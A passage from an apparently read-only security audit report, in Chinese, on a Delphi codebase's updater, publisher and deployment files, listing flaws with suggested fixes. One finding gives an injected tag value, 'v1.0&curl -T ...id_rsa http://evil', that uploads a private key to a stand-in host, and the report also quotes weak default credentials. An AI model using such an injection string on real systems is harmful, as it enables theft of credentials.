**说明**：① 即使 `--sha256` 传对了，哈希值本身与包都来自同一下载通道/同一调用参数，**无任何非对称签名或固定公钥**→ 能篡改包就能同时篡改哈希（信任模型不成立）；② `IsPathUnderRoot` 只用于校验后续拷贝目标，**不校验 zip 条目名**，而 `ExtractAll`（`:289`）已经在它之前把文件写出 → 防护位置错误（经典 zip-slip）；③ `:183-213` 校验与 `:289` 解压对同一路径两次打开，中间存在窗口（可用符号链接/目录替换或重定向实现 TOCTOU）；④ `:65-75` 的路径检查不解析重解析点（symlink/junction），`ExtractDir` 内一个链接即可把文件写到任意位置。
**触发条件**：下载通道被中间人控制；或 ExtractDir 路径可被低权进程预建。
**建议修复**：强制 Authenticode 发布者/嵌入签名校验（不止哈希）；解压前逐条校验 `ZipFile.FileNames[i]`（禁 `..`/绝对路径/盘符）并用 `TZipFile.Read` 逐条目写入+句柄带 `FILE_FLAG_OPEN_REPARSE_POINT`；对包文件本身用句柄一次打开、同一句柄读与解压（消除 TOCTOU）。

#### T-UPD-R03 🔴 进程终止失败被视为成功 → 覆盖运行中二进制失败/半更新
**文件**：`Tools\UpdaterHelper\UpdaterHelper.Core.pas:142-160`（关键 `:125`）
```pascal
function KillProcessById(...): Boolean;
begin
  HProc := OpenProcess(PROCESS_TERMINATE ...);
  if HProc = 0 then Exit(True);              // 打不开进程 → 视作"已终止"
  ...
  if TryGetProcessImagePath(PID, LPath) then  // :125 取不到路径 → 直接跳过该进程
```
**说明**：① `OpenProcess` 失败（权限不足/已退出/被保护）统一返回 True，调用方无法区分"真的没在运行"与"没能终止"；② `:125` 只在成功取到镜像路径时才参与匹配，32/64 位交叉或权限不足时 `TryGetProcessImagePath` 常失败 → 目标进程被当作"不相关"而跳过，随后 `TFile.Copy` 覆盖一个正在执行的 exe → Windows 返回共享冲突，更新在随机机器上失败或被部分应用。
**触发条件**：以非管理员更新以管理员运行的进程；或 32 位工具处理 64 位目标。
**建议修复**：`OpenProcess` 失败时区分 `ERROR_ACCESS_DENIED`（报错）与 `ERROR_PROCESS_NOT_FOUND`（可忽略）；路径取不到时保守视为冲突并中止；拷贝前用 `RenameFile` 先行探测文件是否可独占。

#### T-UPD-R04 🔴 回滚路径中途退出造成"新已删、旧未还"；备份目录永不删除
**文件**：`Tools\UpdaterHelper\UpdaterHelper.Core.pas:336-344`、`:215-259`（`:249-253`）
```pascal
finally
  ... DeleteDir(ExtractDir) ...   // :336-344 只清理解压目录，BackupDir 永久残留
```
**说明**：① 安装失败后调 `RestoreBackup`（`:215-259`），其循环内 `:249-253` 在单个文件恢复失败时 `Exit(False)` → 前几个文件已还原、后面的新文件已删、旧文件未还 → 安装处于**新旧混合的不一致态**（下次启动即崩溃/数据格式错）；② `finally`（`:336-344`）只删 `ExtractDir`，`BackupDir` 永不删除 → 每次成功更新留一份完整旧版本（体积随版本数累加），除磁盘泄漏外还长期保留旧二进制（含已知漏洞版本）；③ 无回滚成功后的二次校验与标记文件，不记录"上次更新结果"供主程序读取。
**触发条件**：更新中途失败（文件占用/磁盘满）；或多次正常更新。
**建议修复**：`RestoreBackup` 逐文件收集失败、全部尝试完再统一报告，并在回滚前先把新文件移到隔离子目录（可事后再删）；成功路径显式删 BackupDir（或保留 N 份后轮转）；写入更新状态标记文件供启动自检。

#### T-UPD-Y05/Y06 🟡
- `:386` `FillChar(Options, SizeOf(Options), 0)`：若 `Options` 类型含 `string`/动态数组/接口等托管字段，`FillChar` 置零会破坏引用计数前置状态（写入旧指针），属难复现崩溃根因。应改用默认值赋值或确保记录为纯托管无旧值（在 `var` 声明处编译器已清零，`FillChar` 多余且危）。
- `:46-58` `LogLine` 固定写 `%TEMP%\DeepBase.UpdaterHelper.log`：无轮转、无大小上限、无 ACL 收紧；多用户机器上共用同名文件（先创建者独占/失败静默），低权用户可预建该文件造成日志注入/拒绝写入。建议按用户目录+日期分文件并限速/轮转。

#### T-UPD-B07/B08 🔵
- 退出码语义未文档化（主程序无法区分"用户取消"与"真失败"）；建议定义退出码表并写入日志首行。
- 无任何单元测试/伪命令行自验入口（该单元纯函数多，本可低成本验证）。
**未发现问题维度**：② 内存与生命周期（本单元以过程式为主，`TFileStream`/`TZipFile` 均 try/finally 配对）、③ 线程安全（单线程 CLI，无线程）**未发现问题**。

---

### 3.7 `Tools\UniPublisher\`（统一发布器，7 项：🔴2 🟡3 🔵2）

#### T-PUB-R01 🔴 `cmd /c gh ...` 拼接未引号化的 Tag/仓库名 → OS 命令注入 / 任意文件外传 / 发布目标劫持
**文件**：`d:\_Progs\02Business\DeepBase\Tools\UniPublisher\Core\Publisher.Targets.pas:566`、`:645-646`、`:577`、`:636-638`、`:662-663`
```pascal
    CmdLine := 'cmd /c gh ' + Args;                                    // :566
    if CreateProcess(nil, PChar(CmdLine), nil, nil, True, ...)         // :577
// :645-646
  Args := Format('release create %s "%s" --repo %s --notes-file "%s" --title "%s"',
    [Tag, PackagePath, RepoSlug, NotesFile, Tag]);                     // Tag 未加引号
```
**说明**：`Tag` 与 `RepoSlug` 来自项目配置/输入框，**未经引号包裹也未过滤 cmd 元字符**（`&`、`|`、`^`、`>`、`<`、`%`）。`cmd /c` 会在 `gh` 启动前解析这些元字符 → 形如 `v1.0&curl -T C:\Users\...\id_rsa http://evil` 的 tag 即可在发布时以当前用户权限执行任意命令（包括把本地凭据/私钥文件上传，`PackagePath` 参数同样可控）；`--repo <attacker/slug>` 可把发布目标劫持到攻击者仓库（制品供应链污染）。另外 `:636-638` 的 `NotesFile := Format('gh_notes_%s_%s.txt', [AppName, Tag])` 未净化，包含 `..` 或路径分隔时产生**路径遍历写**，`:662-663` 的 `TFile.Delete(NotesFile)` 同变**任意文件删除**。
**触发条件**：发布一个 tag/仓库名/项目名含元字符或路径分隔符的配置（或从不可信源同步版本标签）。
**建议修复**：不用 `cmd /c`，直接 `CreateProcess('gh.exe', 参数串)`；参数级转义（对 `"` 双写）并把所有用户可控值强制引号包裹；对 Tag 做 `^[A-Za-z0-9._-]+$` 白名单、对 RepoSlug 做 `^owner/name$` 校验；NotesFile 放 `TPath.GetTempFileName` 随机路径并强制 `StartsWith(TempDir)` 断言；失败时保留 notes 供审计但记加密目录。

#### T-PUB-R02 🔴 发布逻辑第二真源：`MainForm.PublishToGitHub` 重复实现同一发布，且把 `ShellExecuteEx` 返回值当发布成功
**文件**：`d:\_Progs\02Business\DeepBase\Tools\UniPublisher\Forms\DeepPublisher.MainForm.pas:1588-1602`、`:1570-1586`、`:1118`、`:1277`、`:1300`、`:1328`、`:1476`
```pascal
// :1570-1586 RunShellCommand
  SE.lpFile := 'cmd.exe'; SE.lpParameters := ...;
  Result := ShellExecuteEx(SE);          // 返回“能否启动进程”，不是 gh 退出码
  // SEE_MASK_NOCLOSEPROCESS 已置，但从不 CloseHandle(SE.hProcess) → 句柄泄漏
// :1588-1602 PublishToGitHub
  Args := Format(' release create %s ...', ...);   // 与 Publisher.Targets.pas:645-646 同型注入
```
**说明**：① 与 `Publisher.Targets.pas` 的 `TGitHubPublisher` 平行存在第二套 GitHub 发布实现（SSOT 违反），两处都带同型命令注入（R01），修一处漏一处；② `ShellExecuteEx` 为 True 仅表示进程创建成功，**gh 认证失败/上传失败完全被当成发布成功**，UI 显示绿色成功而仓库无 release（典型“校验失败仍放行”）；③ `SEE_MASK_NOCLOSEPROCESS` 后从不 `CloseHandle(hProcess)` → 每次发布泄漏一个进程句柄；④ `:1594-1595` 的 TempNotes 不删除；⑤ `:1118`、`:1277`、`:1300`、`:1328`、`:1476` 都用 `TPath.Combine(edtOutputDir.Text, edtPackageName.Text)` 直接拼接用户输入的包名，包名含 `..`/绝对路径时写出到输出目录之外（路径遍历写）。
**触发条件**：从主窗体而非统一发布器入口点击"发布到 GitHub"（或 gh 未登录/token 失效）。
**建议修复**：删除 `MainForm` 内的发布实现，全量委派给 `TGitHubPublisher`（单一真源）；子进程必须 `WaitForSingleObject` + `GetExitCodeProcess` 且退出码非 0 视为失败；`try/finally CloseHandle(SE.hProcess)`；包名过 `ExtractFileName` + 字符白名单 + `IsPathUnderRoot(OutputDir, FinalPath)` 断言。

#### T-PUB-Y03/Y04/Y05 🟡
- **Y03 输出捕获阻塞与乱码**：`:584-590` 先读到管道 EOF 再 `WaitForSingleObject(INFINITE/60000)` → `gh` 交互式提示凭据时永久阻塞（子进程继承句柄不关则 EOF 永不到）；超时分支不 `TerminateProcess`，进程泄漏；`:587` `Output := Output + string(Buffer)` 按 ANSI 码页转换子进程 UTF-8 输出（中文乱码）且字符串拼接 O(n²)。建议：带超时的 `PeekNamedPipe` 循环 + `WaitForSingleObject` 超时后 `TerminateProcess`；字节级累加到 `TMemoryStream` 后 `TEncoding.UTF8.GetString`；子进程侧强制 `GH_PROMPT_DISABLED=1`。
- **Y04 Gitee token 处理**：`:358-359`、`:717-720`、`:728-730` 把 access_token 写入 JSON body 并连同 URL 进入日志/异常文本风险区（未确认脱敏）。建议日志输出统一走 `MaskSecret()`；优先用 `Authorization` 头。
- **Y05 编码**：`Publisher.Targets.pas:359` 等处中文乱码（同 T-WS-B10），构建可重现性问题。

#### T-PUB-B06/B07 🔵
- 发布重试/幂等未建模（同一 tag 重跑 `release create` 必失败，应改为"存在则更新"）。
- 发布结果（tag/资产/仓库）未写入任何证据存储（与 Governance 的 `EvidenceRecorder` 无任何连接）——发布这类高影响动作应可审计。
**未发现问题维度**：② 内存与生命周期（除 T-PUB-R02③ 的句柄泄漏外，流/JSON 对象均 try/finally 配对）本项其余**未发现问题**。

---

### 3.8 `Tools\` 其余目录（5 项：🔴0 🟡3 🔵2）

#### T-OTH-Y01 🟡 `DBClientStub` 编译专用桩混在产品目录
**文件**：`d:\_Progs\02Business\DeepBase\Tools\DBClientStub\DBClient.pas:3`、`:23`
```pascal
// COMPILE-ONLY STUB ... NOT part of DeepBase.     // :3
  // stub: no-op                                    // :23
```
**说明**：空实现单元与真实 API 同名，若被误加入下游项目的 uses 搜索路径，会静默替换真实实现（no-op）——表现为"连接成功但数据不写"的难以定位缺陷。属架构/卫生问题（非运行时 bug），定 🟡。
**建议**：移出 `Tools\`（入 `tests/` 或 `tools/devstub/`）并改单元名前缀避碰（如 `DevStub.DBClient`），加编译期 guard 阻止产品配置包含。

#### T-OTH-Y02 🟡 `LogAnalyzer.Export` 直接写用户路径且吞异常、无输出目录校验
**文件**：`Tools\LogAnalyzer\LogAnalyzer.Export.pas:127`、`:159`、`:281`、`:322`（多处 `SaveToFile`/`TFile.WriteAllText`）
**说明**：导出前不校验目标目录可写/磁盘空间，写入异常由上层统一吞成"导出完成"类提示；CSV 导出同样未做公式注入防护（CWE-1236，与 T-STU-R04 同型）。定 🟡（工具软件，不直接触及生产库）。
**建议**：导出结果逐文件回报；CSV 统一走同一个带防护的 writer 工具函数（避免第三处真源）。

#### T-OTH-Y03 🟡 `Calib.SweepLib` 扫参边界
**文件**：`Tools\Calibration\Calib.SweepLib.pas:375-377`、`:454`
**说明**：扫参网格维度乘积无上限（笛卡尔积在参数较多时爆炸），`:454` 的结果容器无容量预估且循环内重复分配。属性能/可用性（UI 可冻结），不致错。
**建议**：加组合数上限与预估提示；预分配 `SetLength`。

#### T-OTH-B04/B05 🔵
- `Tools\LogAnalyzer\LogAnalyzer.Stats.pas:203`、`:253`、`:308`、`:341`：四处 `TComparer<T>.Construct` 未 `Free`（与 T-STU-B12、CLI.Pipeline 同型，**全库性模式缺陷**，建议集中修一把）。
- `Tools\LogAnalyzer\LogAnalyzer.MainForm.pas:834` 中文乱码（编码不统一，同 T-WS-B10）。

#### 抽样覆盖声明
`Tools\Gallery\`、`Tools\FMXGallery\` 单元素阅其 interface 区公共 API 并做模式扫描：无拼 SQL、无手工线程、对象均 try/finally 配对→ **7 个维度均未发现问题**（未发现值得登记的缺陷）。`Tools\Studio\`、`Tools\Tray\`、`Tools\WebAPI\`、`Tools\CLI\` 其余未逐行精读的单元，均已完成 interface 区通读与四类模式扫描（拼 SQL / 线程 / Free 配对 / 吞异常），未发现本确证级别的遗漏；若存在仅体现在私有方法局部的逻辑缺陷，不在本次只读审计的可断言范围内。

---

### 3.9 `Tools\` 装配/文档类发现（超出 `.pas` 口径，3 项：🔴1 🟡2）

> 用户口径为"全部 `.pas`"；本节内容不在 `.pas` 内，但与 `Tools\WebService\` 同目录并会直接形成部署风险，故单独列出并标明口径越界。

#### T-DEP-R01 🔴 默认弱凭据入库 + 服务端口直接暴露（但该装配文件与本目录代码不对应）
**文件**：`d:\_Progs\02Business\DeepBase\Tools\WebService\docker-compose.yml:29`、`:32`、`:57`、`:61`、`:80`、`:81`、`:139-140`
```yaml
  JWT_SECRET=${JWT_SECRET:-change-me-in-production}   # :32
  DB_PASSWORD=${DB_PASSWORD:-unibase}                  # :29 / :61
  - "5432:5432"   # :57 Postgres 映射宿主机
  - "6379:6379"   # :80 Redis 映射宿主机
  # :81 redis 无 --requirepass
  GF_SECURITY_ADMIN_PASSWORD=admin                     # :139-140 Grafana admin/admin
```
**说明**：所有服务都有可用即弱默认值（`change-me-in-production` 长 23，能通过 `DeepBase.WebAPI.Auth.pas:700` 的 `Length >= 16` 校验）、数据库无密码保护、Redis 完全匿名、Grafana 管理员 admin/admin、数据库/缓存端口映射到宿主机。**重要修正**：全仓检索 `JWT_SECRET` 仅命中本文件，`docker-compose.yml` 描述的是 unibase/Postgres/Redis/Grafana 栈，与本目录 Delphi 单元无对应关系 → 它**不影响当前 Delphi 服务的真实密钥信任**（故不定性为"JWT 可伪造"）；风险为“误导性部署文档 + 默认弱凭据入仓”，一旦有人照此启动真实服务即成严重漏洞。
**触发条件**：直接 `docker compose up` 未设置环境变量。
**建议修复**：删除 `:-默认值`（无默认则 compose 直接报错）或将默认改为不可能启动的占位；Postgres/Redis 仅用内部网络（去掉 `ports:` 映射）；Grafana 密码改为从 secret 注入；同时在文件头部注明"本文件与本目录 Delphi 单元不对应"或直接移入独立部署仓。

#### T-DEP-Y02/Y03 🟡
- `Tools\SeedTool\共享密钥配置.md`（见 T-SEE-R01②）以文档形式分发真实密钥并随 `batch_seed.bat` 跨仓复制。
- `Tools\SeedTool\batch_seed.bat` 把同一模板 DB 分发到 9 个外部项目（跨仓分发密钥材料，无版本/校验/回收机制）。

---

## 4. 🔴 Top10（按影响与可利用性排序）

| # | 位置 | 一句话描述 |
|---|---|---|
| 1 | `Tools\CLI\DeepBase.CLI.SSH.pas:449`、`:620`、`:1413-1436` | SSH 后端实为恒 mock，`connect/execute/upload/download` 全部伪造成功，并用**假内容覆盖本地文件**（运维信以为真 → 数据损坏）。 |
| 2 | `Tools\UniPublisher\Core\Publisher.Targets.pas:566` + `:645-646` | `cmd /c gh ` 拼接未引号化的 Tag/RepoSlug → OS 命令注入、任意文件外传、发布目标劫持（制品供应链污染）。 |
| 3 | `Tools\UpdaterHelper\UpdaterHelper.Core.pas:191-192` + `:449-459` + `:289` | 不传/误传 `--sha256` 即完全跳过包校验，全程无签名，且 `ExtractAll` 先于 zip-slip 检查 → 未校验包可直接覆盖自身二进制。 |
| 4 | `Governance\DeepBase.Governance.ConfigRegistrar.pas:1023-1035` + `:964-994`、`ReviewQueue.pas:180-260`、`ActionExecutor.pas:81-94`、`Lifecycle.pas:205`/`:231` | 治理门禁端到端可绕过：篡改即降级 observe **并重新签名抹除痕迹**；未解锁时 HMAC 恒失败；`Verify` 从不校验 `AActionKey`（凭证跨动作移植）；不传凭证即跳过批准校验；哈希链零密钥。 |
| 5 | `Tools\WebService\DeepBase.WebAPI.Auth.pas:1777-1853` | CSRF double-submit 的 token 与会话零绑定（服务端 Cookie 解析未实现）→ 任意固定 token 即可通过，CSRF 防护形同不存在。 |
| 6 | `Tools\WebService\DeepBase.WebAPI.Auth.pas:1002-1036` | refresh token 可当 access token 使用（不校验 `type` claim）→ 长期凭据获得短期凭据同等权能，无法通过 logout 失效。 |
| 7 | `Tools\WebService\DeepBase.WebAPI.WebSocket.pas:915-916` + `:1053-1131` | Origin 为空即放行 + 握手阶段无任何认证 → 跨站 WebSocket 劫持（CSWSH），任意页可读写治理相关频道。 |
| 8 | `Tools\WebService\DeepBase.WebAPI.Core.pas:712`、`:756` | multipart 请求体经 UTF-8 文本往返后再取字节 → 二进制上传（模型/图片/DB 包）**静默损坏**，且无请求体上限（内存耗尽面）。 |
| 9 | `Tools\SeedTool\uBasicProtection.pas:10-12`/`:444-468`/`:134-157`/`:493-499` + `uAntiTamperPackage.pas:111`/`:581` | 硬编码口令与共享密钥制度化 + 伪 HMAC（可长度扩展伪造）+ 填充剔负索引越界读 + 二进制走 UTF-8 有损哈希→ 防篡改体系不成立；`EnableHMAC` 单开关即整体关闭。 |
| 10 | `Tools\Studio\Frames\Studio.ImportExportFrame.pas:898`/`:251`/`:867-872` + `Studio.BackupFrame.pas:442-454` | 表名/列名拼 SQL（恶意 `.db`/`.csv` 触发任意 SQL）+ Truncate 在事务外不可回滚；恢复时 zip 不校验且盲取 `Files[0]` 覆盖当前库、空结果仍报"恢复成功"。 |

**候补（未进 Top10 但同样为 🔴）**：`Tools\WebService\...Observability.pas:741`（无界基数 DoS + 指标注入）；`Tools\Studio\Studio.LicenseForm.pas:232`（签发密钥硬编码）；`Governance\...Runtime.pas:113-126`（路由目标不受 `AvailableActions` 约束）；`Governance\...GateResolver.pas:97-98`/`:112-119` + `gsLocked`/`gsFrozen` 全库无生产者（声明性锁死状态不可达）；`Governance\...AI.ViewScopeEnforcer.pas:117-124`（空 tenantId 跳过租户隔离）；`Governance\...JsonLogicEvaluator.pas:72-92`（一个闭包抹平 7 种条件 kind）；`Tools\Tray\Automation\Tray.Automation.pas:442-454`（命令交 `cmd.exe`、无确认无审计不接治理）。

---

## 5. 存疑区（不确定，需作者/运行验证）

| # | 位置 | 存疑点 | 为何不定性 |
|---|---|---|---|
| Q1 | `Governance\DeepBase.Governance.ReviewQueue.SQLite.pas:459-468`、`DueChecker.pas` | 写入用 `DateToISO8601(UTC=True)`，读回用 `ISO8601ToDate(...,False)`（按本地时区解释）；`DueChecker` 又对日期做**字符串比较**。若格式包含 `Z` 后缀，字典序与时间序一般一致；一旦存在带偏移量（`+08:00`）的变体，`due_at` 判定可提前/延后放行。 | 未实际跑过两种格式的字典序对比；影响取决于写入端是否总是 `Z`。建议：统一存 Unix 毫秒整数。 |
| Q2 | `Governance` 多处 `if Assigned(AX) then`（X 为 `reference to` / 嵌套过程形参） | 对匿名方法变量用 `Assigned()` 在某些编译器版本会产生非预期结果（栈上指针非 nil）。 | 未逐一确认哪些形参实际为托管类型；建议以显式布尔开关参数替代。 |
| Q3 | `Tools\WebService\DeepBase.WebAPI.WebSocket.pas:1153-1161` | `GetConnection` 未初始化 `Result`，返回值完全依赖 RTL 版本中 `TryGetValue` 失败时是否写入 `Default`。 | 不同 Delphi 版本行为不一；属"依赖未声明行为"而非已证缺陷。 |
| Q4 | `Tools\WebService\DeepBase.JsonLogic.pas:160-161` | 表达式求值返回 `Manage` 登记池中的**引用而非 Clone**；若同一对象同时被两个调用方 `Free` 则 double-free。目前只看到 `OpVar` 分支走 `Clone`，其余路径未证实重复释放。 | 需要完整对象图生命周期或动态跟踪才能断言。暂存疑。 |
| Q5 | `Tools\WebService\DeepBase.WebAPI.Auth.pas:1618-1624` | 中间件在部分分支返回 `nil`，若装配时仍被加入链，是否导致整个请求短路失败或静默跳过鉴权。 | 取决于未见的装配代码（`Program.pas` 不属本目录）。 |
| Q6 | `Tools\WebService\DeepBase.WebAPI.WebSocket.pas` 整体 | 握手无认证（已定为 🔴），但是否在**首帧**要求交凭据（应用层认证）未能从代码中否定。 | 若有首帧认证，R 级可降；本审计未见该逻辑，但仍列为存疑。 |
| Q7 | `Tools\WebService\DeepBase.WebAPI.Observability.pas:683-715` | `/metrics`、`/health` 自身不做鉴权，但是否被全局中间件覆盖取决于注册顺序。 | 装配代码不在范围内。建议：在 `RegisterHandlers` 内部强制绑定只读角色。 |
| Q8 | `Tools\Studio\Frames\Studio.ImportExportFrame.pas:913-914` | 事务内 `Application.ProcessMessages` 能否真重入（取决于 `btnImport.Click` 入口是否先 `Enabled := False`）。未读到禁用自身的那一行。 | 若已禁用，Y07 降为 🔵；否则升 🟡（已按 🟡 计）。 |
| Q9 | `Governance\DeepBase.Governance.ReviewQueue.SQLite.pas:396-412` | `ComputePayload` 不含 `status`/`decision_id`，看上去可"批条未用却标记已用"类混淆；但该单元头注释 `:8-12` 明确论证了这是**有意设计**（凭证绑定请求内容而非响应状态），且 `allowed_decisions`/`authorization_scopes`/`evidence_refs` **已**在 payload 内（`:401-412`）。 | 设计可争议但非实现遗漏；本报告已从 🔴 候选降级为 🟡/存疑，**不应重复定性**。 |

---

## 6. 各维度"未发现问题"清单（已正面核查）

| 范围 | 维度 | 结论 |
|---|---|---|
| `Governance\` 全部 42 单元 | ⑦ 超 2000 行大文件 | **未发现问题**。本层最大为 `DeepBase.Governance.ConfigRegistrar.pas` 1133 行；`Tools` 侧最大 `Auth.pas` 1866 / `WebSocket.pas` 1400 / `DeepBase.CLI.SSH.pas` 1470 / `Interactive.pas` 1568，均未达 2000。（口径：以 `Read` 返回 total 为准，不用 `Measure-Object -Line`） |
| `Governance\DeepBase.Governance.GateResolver.pas:70-83` | ⑤ 门禁 fail-open | **未发现问题**（无对应评估器时 `Result := False`，方向正确）。 |
| `Governance\DeepBase.Governance.ActionGrid.pas:288-289` | ① 预览副作用 | **未发现问题**（`rmPreview` 确实不执行 bridge）。 |
| `Governance\DeepBase.Governance.AI.*`（ViewScopeEnforcer） | ① 枚举完备性 | `TViewScopeVisibility` 三值（visible/hidden/locked）**均有分支处理**，未发现落入默认放行的未处理态（真正的缺陷是空 tenantId，已入 🔴）。 |
| `Tools\WebService\...Auth.pas:759-786` | ⑤ 时序侧信道 | **未发现问题**（`JWT.Verify` 签名比较为恒定时间：长度先判 + 逐字节 `xor` 累加）。 |
| `Tools\WebService\...Observability.pas:691-698`、`:724-727` | ② 对象所有权 | **未发现问题**（`RunAll` 的 JSON 所有权清晰；闭包捕获前显式复制了数组，与 T-WS-R03 形成正反对照）。 |
| `Tools\Studio\` 全体 | ③ 线程安全 | **未发现问题**（无手工线程；Y07 为消息泵重入，已单列）。 |
| `Tools\Studio\` 除索引耦合项 | ② 内存与生命周期 | **未发现问题**（Frame 统一 `Parent := Self` + destructor 解绑事件，`LLMFrame.pas:171-179` 为正确范例）。 |
| `Tools\Tray\` 除 Automation | ②③ | **未发现问题**（6 个 Frame 通读结果见 T-TRY-Y07）。 |
| `Tools\SeedTool\uSeedMain.pas`/`SeedTool.dpr` | ②③⑥ | **未发现问题**（FireDAC 对象 try/finally 配对、无自建线程、参数化写入）。 |
| `Tools\UpdaterHelper\` | ②③ | **未发现问题**（流/zip 均 try/finally；单线程 CLI）。 |
| `Tools\Gallery\`、`Tools\FMXGallery\` | 全部 7 维度 | **未发现问题**（已通读公共 API + 四类模式扫描）。 |
| `Governance\` 除已登记项 | ④ 异常路径资源泄漏 | 未发现额外泄漏（吞异常集中于 G-Y26 清单，属"隐埋失败"而非"资源泄漏"）。 |

---

## 7. 结语与依赖方向结论（维度⑦ 专项）

1. **依赖方向正确**：`Governance\` 仅 `uses` Core/Schema/平台单元，grep 未发现对 `Features\`/`VCL\`/`FMX\`/`Tools\` 的反向引用 → 分层本身健康。问题不在方向，而在**接入度为零**（G-R14）。
2. **门禁逻辑存在多个第二真源且行为不一致**：模式判定（`ConfigRegistrar.GetMode` vs 注释期望）、DueChecker（`Executor.pas:108-118` vs `Grid.pas:279-285`）、条件 kind 字符串→枚举（`Schema.pas:231-240` 大小写不敏感 vs `ConfigLoader.pas:117-126` 敏感）、SCOPE 名称（`ReviewQueue.pas:183-185` 内联 vs `TReviewQueueSQLite.ScopeToStr`）、发布逻辑（`Publisher.Targets.pas` vs `MainForm.pas`）、键鼠注入（`Tray.Automation.pas` vs 孤儿 `Tray.KeyboardMouse.pas`）。**建议：为每个概念指定唯一归属单元，其余一律改为调用，并用 grep 基线 CI 防回潮。**
3. **SSOT 缺失最严重的一点**：治理模式（enforce/observe/off）没有不可变的单一权威来源——既可被 DB 内容静默改写（G-R01），又可在启动时因签名密钥不可用而被静默摧毁（G-R02），还能被 `TObserveGateResolver` 包装层无条件抹成 `gsOpen`（G-R04）。
4. **死代码/半成品集中区**：孤儿单元 `Tray.KeyboardMouse.pas`；`Tools\DBClientStub\DBClient.pas` 编译桩；`gsLocked`/`gsFrozen` 无生产者；`Validation.pas:436-489` 八条 `Result := nil` 占位 INV；`Tray.SysMonitor.pas:201-211` 占位指标；多处 `not yet implemented`。
5. **全库性模式缺陷（建议一次修一把而非逐处修）**：① `TComparer<T>.Construct` 未释放（至少 6 处）；② "哨兵 0 = 永不过期"（`Seal.pas:156-159`、`RouteResolver.pas:131`、`Auth.pas:1057-1060`、`LicenseForm.pas:506-507`）；③ 表名/标识符拼接而非转义；④ 中文源码文件编码不统一（影响构建可重现性）。

> 本报告为只读审计，未修改任何源码。所有行号基于本次审计时工作区快照，后续代码变动后需重新定位。
